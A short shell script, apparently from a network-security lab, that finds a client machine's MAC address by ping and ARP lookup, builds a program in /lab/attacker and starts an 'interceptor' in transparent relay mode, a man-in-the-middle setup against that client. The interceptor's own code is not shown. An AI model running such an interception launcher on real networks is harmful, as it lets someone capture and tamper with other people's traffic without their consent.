#!/bin/sh
set -eu

pkill -f '[i]nterceptor' 2>/dev/null || true

ping -c 1 -W 1 172.16.1.10 >/dev/null 2>&1 || true
arping -c 1 -w 1 -I eth0 172.16.1.10 >/dev/null 2>&1 || true

CLIENT_MAC=$(ip neigh show 172.16.1.10 2>/dev/null | awk '/lladdr/ {print $5}' | head -n 1)
if [ -z "$CLIENT_MAC" ]; then
    CLIENT_MAC=$(awk '/172.16.1.10/ {print $4}' /proc/net/arp 2>/dev/null | head -n 1)
fi

cd /lab/attacker
make

if [ -n "$CLIENT_MAC" ] && [ "$CLIENT_MAC" != "00:00:00:00:00:00" ]; then
    nohup ./interceptor --relay --client-mac "$CLIENT_MAC" > interceptor.log 2>&1 &
else
    nohup ./interceptor --relay > interceptor.log 2>&1 &
fi

sleep 1
cat interceptor.log
echo "Interceptor running in transparent relay mode."
